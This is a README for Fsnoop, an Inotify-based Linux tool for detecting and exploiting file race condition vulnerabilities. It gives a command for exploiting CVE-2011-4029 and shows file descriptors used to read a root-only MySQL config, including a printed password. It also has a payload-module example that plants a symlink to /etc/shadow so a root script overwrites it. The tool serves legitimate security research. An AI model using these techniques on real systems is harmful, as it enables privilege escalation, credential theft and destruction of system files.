# Fsnoop

## Introduction

Fsnoop is a tool to monitor file operations on GNU/Linux systems by using
the [Inotify](https://en.wikipedia.org/wiki/Inotify) mechanism.  Its
primary purpose is to help detecting file race condition vulnerabilities
and since version 3, to exploit them with loadable DSO modules (also called
"payload modules" or "paymods").

## Installation

The kernel option ``CONFIG_INOTIFY_USER`` is required, check this parameter
with the following command:

    $ grep CONFIG_INOTIFY_USER /boot/config-`uname -r`
    CONFIG_INOTIFY_USER=y

Clone this repository and compile with "``make``".

## Usage

Here is the output of the ``--help`` option:

    $ ./fsnoop --help
    Usage: fsnoop [OPTIONS] [DIR1[,DIR2,...]] [-- COMMAND]
  
      -d              Run as a daemon
      -e              Monitor every Inotify events
      -fd             Open file descriptors when it's possible
      -k              Send SIGSTOP signal to the running process (COMMAND)
      -o <filename>   Redirected output to a specific file
      -p <payload.so> Load a payload module (DSO file)
      -r              Monitor directory contents recursively
      -t              Prefix each line with the time of day
      -v              Display version
    
    If no DIR is specified, default writable directories such as /tmp,
    /var/tmp, /dev/shm, etc. are monitored.
    
    If COMMAND is specified, monitoring will occur only during the process
    duration.

## Output description

During filesystem activity monitoring, Fsnoop output looks as shown below:

    $ ./fsnoop
    [+] monitor /dev/shm
    [+] monitor /tmp
    [+] monitor /var/lock
    [+] monitor /var/tmp
    [C] -rw------- 1 root root 0     Tue May  8 22:17:10 2012 /var/tmp/test
    [M] -rw-r--r-- 1 root root 0     Tue May  8 22:17:10 2012 /var/tmp/test
    [U] -rw-r--r-- 1 root root 1741  Tue May  8 22:17:27 2012 /var/tmp/test
    [M] -rwxrwxrwx 1 root root 1741  Tue May  8 22:17:27 2012 /var/tmp/test
    [D] F /var/tmp/test

The first four lines tells which directories are being monitored.  By
default, those directories are system's world-writable directories.
Next lines are Fsnoop events (one per line).

An event begins with an action character (placed between brackets):

  - 'C' is for Create;
  - 'M' is for Modify (means that metadata changed: permissions,
               timestamps, link count, UID, GID, etc.);
  - 'U' is for Update (means that file content was modified);
  - 'D' is for Delete.

We will see later that we can display Inotify event full names (i.e.
``IN_ACCESS``, ``IN_ATTRIB``, etc.) instead of this action character.  By
default, the action character is chosen for simplicity and light output.

This action character is followed by an output similar to the "``ls -l``"
command (for a better readability).  If for any reason, Fsnoop isn't able
to ``stat()`` the file, the "ls-like" output is replaced by a shorter string
(see the last line of the example above).  This string contains the
filename preceded by the file type information (also on one character):

  - 'F' is for File
  - 'D' is for Directory

## Basic options

To monitor activities in specific directories ("``/etc``" and "``/tmp``"):

    $ ./fsnoop /etc,/tmp

To run Fsnoop as a daemon (``-d``) and record activities in an output file
(``-o``):

    # ./fsnoop -d -o /root/fsnoop.log /var/tmp

To monitor activities just during a specific process duration:

    # ./fsnoop /etc -- install -m 600 file1 /etc/
    [+] monitor /etc
    [C] -rw-r--r-- 1 root root 0  Wed Apr 10 13:17:13 2013 /etc/file1
    [M] -rw------- 1 root root 0  Wed Apr 10 13:17:13 2013 /etc/file1

To monitor new directories recursively (may require a more favorable
scheduling priority):

    # nice -n -20 ./fsnoop -r /tmp
    [+] monitor /tmp
    [C] drwxr-xr-x 2 root root 4096  Mon Apr 22 11:03:38 2013 /tmp/a
    [C] drwxr-xr-x 2 root root 4096  Mon Apr 22 11:03:41 2013 /tmp/a/b
    [C] -rw-r--r-- 1 root root 0     Mon Apr 22 11:03:58 2013 /tmp/a/b/file

To display full names of Inotify events instead of action characters (note
that with this option, every Inotify events are monitored):

    $ ./fsnoop -e -- mv /tmp/a /tmp/b
    [...]
    [IN_MOVED_FROM   ] F /tmp/a
    [IN_MOVED_TO     ] -rw-r--r-- 1 root root 0  Mon Jun 17 22:38:56 2013 /tmp/b

## Advanced options

### Send SIGSTOP/SIGCONT signals (-k)

The "``-k``" option automatically sends the ``SIGSTOP`` signal to a process
when an event occurred on a specific file.  This signal stops the process
execution until SIGCONT is sent (see ``kill(1)``).  For instance, the
following command can be used to exploit CVE-2011-4029:

    $ ./fsnoop -k /tmp/.tX1-lock -- X -ac :1
    [...]
    [C] F /tmp/.tX1-lock
    *** PID 30342 stopped, type [Enter] to resume execution: 
    *** PID 30342 resumed ...

### Open files (-fd)

The "``-fd``" option opens every new files.  This is used to keep an eye
on their content even when the file is removed or even better, when its
permissions changed (read access removed).  Yes, on Linux kernel, a file
descriptor isn't affected when the corresponding filename sees its
permission/ownership changed.

When the monitor mode is stopped with the "ctrl-c" sequence, a shell is
bound, giving an access to opened file descriptors.  To disclose the
content of a file descriptor, you're invited to use the "``cat``" command:

    $ ./fsnoop -fd /etc/mysql
    [...]
    [M] -rw-r--r-- 1 root root 333  Fri Dec 14 15:43:26 2012 /etc/mysql/debian.cnf (opened fd=9)
    [M] -rw------- 1 root root 333  Fri Dec 14 15:43:26 2012 /etc/mysql/debian.cnf
    ^C
    
    Here are opened file descriptors.  You can display their contents by
    using the "cat" command.  For example, to display fd #4 use: "cat <&4"
      
    [...]
    lr-x----- 1 vladz vladz 64  1 janv. 21:43 9 -> /etc/mysql/debian.cnf

    fsnoop$ cat <&9
    # Automatically generated for Debian scripts. DO NOT TOUCH!
    [client]
    host     = localhost
    user     = debian-sys-maint
    password = jf3nSY5eMlvLnnss

### Payload module (-p)

Since the version 3, you can use Fsnoop to exploit a file race condition
vulnerability.  For this, you need to provide a payload module with the
"``-p``" option.  A payload module (or "paymod") consists in an exploitation
code written in C and compiled as a Dynamic Shared Objects (DSO).  If you
need to be faster in your code, this concept allows to use in-line
assembly instructions.

The paymod consists at least of a payload() function that contain the
code to exploits the vulnerability.  Its definition looks like:

    void payload() {
      ...
    }

This payload() function is normally launched when the first event occurs.
We will discuss later about those events but also how it is also possible
to launch it only when specific conditions are met (and not at the first
event).

The paymod may contains optional routines called through the constructor
and destructor attributes.  They allow to execute code when the module is
loaded and unloaded.  This is useful if you need to setup an environment
for your payload to work, and then delete obsolete files or make some
checks after exploitation in done.  Here are how to specify those
attributes:

    void __attribute__((constructor)) init(void) { 
      ...
    }
  
    void __attribute__((destructor)) fini(void) {
      ...
    }

Lets circle back to when Fsnoop must call your payload() function.  There
are two possibilities:

  1) once a specific event occurs on the filesystem
  2) once a specific process starts on the system

In both cases, you have to set a filter.

For possibility #1, filter specifies a fs event which consist in one file
and an Inotify action mask.  In the example bellow, payload() is launched
right after "``/var/lock/prog.lck``" is created:

    /* filter */
    char file[]    = "/var/lock/prog.lck";
    uint32_t mask  = IN_CREATE;

You can find a complete list of Inotify event masks in the man page of
``inotify(7)``.

Also, to postpone the call to payload(), for instance if you don't want it
to run on the first occurrence of the event but at the third, you can use
the optional count variable:

    int count = 2;

For possibility #2, filter specifies a process name.  Once this process
is active on the system, payload() is launched.  Use the variable
``proc_name`` to specify this process name:

    char proc_name[] = "/bin/bash /root/bin/backup.sh";

The string must be exactly the same as what the command "``ps -eo args=``"
would output.

Why launching the payload() when a process starts?  Well, for example, to
predict a filename based on a process ID.

If you set the ``proc_name`` variable AND specify a file with the "``HEREPID``"
string in its name, this string is substituted by the process ID of the
program.  Thus, in certain condition, you may be able to create a
file/symlink based on the PID before the real program does.

Suppose root runs a backup.sh script that creates "``/tmp/backup.$$``" in
an insecure manner.  The following paymod will allow you to create a
symlink and overwrite the "``/etc/shadow``" system file:

    /* filter */
    char proc_name[] = "/bin/bash /root/bin/backup.sh";
    char file[] = "/tmp/backup.HEREPID";

    void payload() { symlink("/etc/shadow", file); }    

Once your Fsnoop module is ready, compile it with:

    $ gcc -w -fPIC -shared -o your-module.so your-module.c

or simply:

    $ make your-module.so

and use it with:

    $ ./fsnoop -p ./your-module.so

Some payload modules, examples and templates are available in the
dedicated repository available at:

    http://vladz.devzero.fr/svn/projects/fsnoop/paymods/

Remember that this is a new feature and that it should be improved.  In
the short term, the aim is to feed this repository with paymods that
exploits known vulnerabilities (contributions are welcomed).  And at the
long term, the idea is to have an option in Fnoop that loads all them so
the end-users will only have to wait for Fsnoop to exploit.

## Thanks

To Larry Cashdollar (``@_larry0``) for testing the tool and bringing new ideas.
